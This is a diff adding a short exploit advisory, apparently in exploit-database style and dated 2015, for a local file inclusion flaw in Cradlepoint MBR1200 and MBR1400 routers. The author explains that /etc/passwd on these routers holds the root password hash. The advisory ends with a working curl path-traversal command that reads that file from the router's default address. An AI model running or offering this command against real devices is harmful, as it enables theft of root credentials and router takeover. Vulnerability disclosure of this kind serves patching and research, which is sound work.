@@ -1,0 +1,17 @@
+# Exploit Title: Cradlepoint MBR LFI
+# Date: 7/7/2015
+# Exploit Author: Doc_Hak
+# Vendor Homepage: https://cradlepoint.com/
+# Version: 1200/1400 (REQUIRED)
+# Tested on: Embedded linux
+
+I found a local file include with root level permissions on
+cradlepoint routers.  So far looks like it works on MBR1400 and MBR1200
+routers, though others could be affected.  I say it is with root level
+because it can read /etc/passwd and there is no "x" indicating the hash is
+stored in the /etc/shadow file.  Therefore the root hash is included in
+this file.
+
+To access the root hash on Cradlepoint MBRs simply:
+
+curl http://192.168.1.1/../../../../../../../../../../../../etc/passwd
